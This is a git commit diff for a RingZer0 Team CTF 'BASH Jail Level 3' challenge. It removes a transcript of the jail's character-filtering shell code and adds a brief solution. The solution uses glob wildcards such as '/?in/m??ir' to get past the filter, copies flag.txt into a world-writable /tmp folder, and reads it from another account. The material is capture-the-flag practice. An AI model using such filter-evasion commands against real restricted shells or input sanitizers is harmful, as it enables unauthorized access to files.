3cd9c10b308577de4928fe538ca9d2707931ccc2
James Allardice <james.allardice@fr.clara.net>
2016-03-17 18:41:16 +0100

    Got it

--- challenge220.sh
+++ challenge220.sh
@@ -1,38 +1,5 @@
-fooker@Barker:~$ ssh level3@ringzer0team.com -p 1016
-level3@ringzer0team.com's password:
+on level3 do:
+/?in/m??ir /tmp/jal4/;cp flag.txt /tmp/jal4/;/?in/chmo? -R 777 /tmp/jal4
 
-RingZer0 Team Online CTF
-
-BASH Jail Level 3:
-Current user is uid=1002(level3) gid=1002(level3) groups=1002(level3)
-
-Flag is located at /home/level3/flag.txt
-
-Challenge bash code:
------------------------------
-
-WARNING: this prompt is launched using ./prompt.sh 2>/dev/null
-
-# CHALLENGE
-
-function check_space {
-	if [[ $1 == *[bdks]* ]]
-	then
-    		return 0
-	fi
-
-	return 1
-}
-
-while :
-do
-	echo "Your input:"
-	read input
-	if check_space "$input"
-	then
-		echo -e '\033[0;31mRestricted characters has been used\033[0m'
-	else
-		output=`$input` &>/dev/null
-		echo "Command executed"
-	fi
-done
+Then reconnect to level1 and get a bash shell:
+cat /tmp/jal4/flag.txt >&2
